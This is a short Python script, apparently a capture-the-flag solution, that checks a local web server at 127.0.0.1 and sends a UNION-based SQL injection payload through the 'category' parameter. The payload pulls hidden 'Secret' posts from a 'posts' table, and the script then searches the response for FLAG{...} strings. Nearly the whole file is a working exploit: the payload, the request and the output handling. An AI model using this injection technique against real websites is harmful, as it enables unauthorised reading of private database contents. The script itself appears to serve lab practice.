import requests
import urllib.parse
import re

# Test basic connectivity first
print("Testing basic connectivity...")
try:
    test_resp = requests.get("http://127.0.0.1:33130/", timeout=5)
    print(f"✓ Connected: Status {test_resp.status_code}")
except Exception as e:
    print(f"✗ Connection failed: {e}")
    exit()

# SQL injection payload
url = "http://127.0.0.1:33130/?category="
payload = "NoExist' UNION SELECT id,title,excerpt,content,category,author,created_at FROM posts WHERE category=0x536563726574--"
full_url = url + urllib.parse.quote(payload, safe='')

print(f"\n[*] SQL Injection Test")
print(f"[*] URL: {full_url}")
print("-" * 80)

resp = requests.get(full_url, timeout=10)

print(f"Status: {resp.status_code}")
print(f"Content Length: {len(resp.text)} bytes")
print(f"\nResponse Content:")
print("-" * 80)
print(resp.text)
print("-" * 80)

# Look for Secret posts
if "Secret" in resp.text:
    print("\n[✓] Secret category content found!")
else:
    print("\n[-] No Secret content found")

# Search for flags
flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
if flags:
    print(f"\n[!!!] FLAGS FOUND: {flags}")
else:
    print("\n[-] No flags found")
